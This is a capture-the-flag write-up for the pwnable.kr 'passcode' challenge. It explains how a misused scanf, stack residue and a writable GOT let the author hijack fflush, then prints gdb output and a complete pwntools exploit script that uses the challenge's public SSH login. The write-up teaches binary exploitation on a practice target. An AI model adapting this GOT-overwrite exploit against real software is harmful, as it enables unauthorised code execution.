# Passcode

First observation:
```c
scanf("%d", passcode1);
scanf("%d", passcode2);
```

The address should be used here, not the value. Also, both values are
uninitialized. How can we set their values?

Since nothing cleans up the stack when you enter and leave functions, the values
that you set on the stack will stay there until they are assigned to.

Using this train of though, we can probably assign to `passcode1` and
`passcode2` if we populate values on the stack and leave them there.

Conveniently, we have a `name` string in `welcome()` that allows us to do just
that.

Let's calculate the offsets.

```gdb
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> ni
enter you name : aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

We see that:
```
&passcode1 = $ebp - 0x10
&passcode2 = $ebp - 0x0c
```

Then try:
```gdb
pwndbg> ds ebp-0x10
ffffc2a8 'yaaa'
pwndbg> ds ebp-0xc0
ffffc1f8 None
```

Looks like we can set `passcode1` with the last 4 bytes of `name`. However, we
can't set `passcode2`.

To set `passcode1`, we need 96 bytes of filler. The last 4 bytes will be some
address that we will overwrite using `scanf`.

Another way to calculate the offset:
```gdb
pwndbg> cyclic -l yaaa
96
```

Anyway, some Googling I found out that a GOF attack will work here.

Immediately after the call to `scanf`, we call `fflush(stdin)`. Since this is
the first call to `fflush`, it isn't mapped to a real address yet.

### Aside on the GOT and PLT

- `plt`: Procedure Linkage Table
- `got`: Global Offset Table

The `plt` is always called first. Each entry in the `plt` looks like this:
- The first instruction is a jump to a function pointer
  - We must dereference it before we jump
  - If it's the first time calling this function, this function pointer points
    to an entry in the `.got.plt`.
      - This entry is initially simply set to the address of the next
        instruction of the `plt` entry.
  - If it's not the first time calling this function, this function pointer
    already points to the calculated real address. We just jump there and never
    execute the subsequent instructions.
- The next instructions are as follows:
  - Push some constant to the stack (a parameter representing the slot number)
  - Jump to a constant address (routine for calculating real address)
  - Set the function pointer of the `plt` entry to the calculated real address

Relocation Read-Only (RELRO) settings:
- Partial
  - `plt` is read-only
  - `.got.plt` is writeable
  - This means that if we control the address of `.got.plt` and it's the first
    time calling the function, we will jump to that address we specified
- Complete
  - `plt` and `.got.plt` are prepopulated by the linker when the program starts
  - Write access is removed
  - Exploit not possible

More info: https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html.

---

Our goal is to write the jump destination in the `.got.plt` for `fflush`. We can
assign an arbitrary address here, so let's pick the address at the `system`
call.

```gdb
pwndbg> disassemble login
Dump of assembler code for function login:
   0x08048564 <+0>: push   ebp
   0x08048565 <+1>: mov    ebp,esp
   0x08048567 <+3>: sub    esp,0x28
   0x0804856a <+6>: mov    eax,0x8048770
   0x0804856f <+11>:    mov    DWORD PTR [esp],eax
   0x08048572 <+14>:    call   0x8048420 <printf@plt>
=> 0x08048577 <+19>:    mov    eax,0x8048783
   0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10]
   0x0804857f <+27>:    mov    DWORD PTR [esp+0x4],edx
   0x08048583 <+31>:    mov    DWORD PTR [esp],eax
   0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:    mov    eax,ds:0x804a02c
   0x08048590 <+44>:    mov    DWORD PTR [esp],eax
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
   0x08048598 <+52>:    mov    eax,0x8048786
   0x0804859d <+57>:    mov    DWORD PTR [esp],eax
   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
   0x080485a5 <+65>:    mov    eax,0x8048783
   0x080485aa <+70>:    mov    edx,DWORD PTR [ebp-0xc]
   0x080485ad <+73>:    mov    DWORD PTR [esp+0x4],edx
   0x080485b1 <+77>:    mov    DWORD PTR [esp],eax
   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:    mov    DWORD PTR [esp],0x8048799
   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
   0x080485c5 <+97>:    cmp    DWORD PTR [ebp-0x10],0x528e6
   0x080485cc <+104>:   jne    0x80485f1 <login+141>
   0x080485ce <+106>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
   0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5 <--- We want this
   0x080485de <+122>:   call   0x8048450 <puts@plt>
   0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:   call   0x8048460 <system@plt>
   0x080485ef <+139>:   leave
   0x080485f0 <+140>:   ret
   0x080485f1 <+141>:   mov    DWORD PTR [esp],0x80487bd
   0x080485f8 <+148>:   call   0x8048450 <puts@plt>
   0x080485fd <+153>:   mov    DWORD PTR [esp],0x0
   0x08048604 <+160>:   call   0x8048480 <exit@plt>
End of assembler dump.
```

Goal address: `0x080485d7`

Script:

```python
import pwn

io = pwn.ssh(
    host='pwnable.kr',
    port=2222,
    user='passcode',
    password='guest'
)

# e_file = io.download_file('passcode')
e = pwn.ELF('./passcode')

io = io.run('./passcode')

fflush_got_plt = e.symbols['got.fflush']
goal_addr = 0x80485d7

name = b'A' * 96 + pwn.p32(fflush_got_plt)
print(name)

p1 = str(goal_addr).encode()
print(p1)

# with open('access', 'wb') as f:
#     f.write(name)
#     f.write(p1)
#     f.write(p2)

io.sendline(name)
io.sendline(p1)
print(io.recvall().decode(errors='ignore'))
```
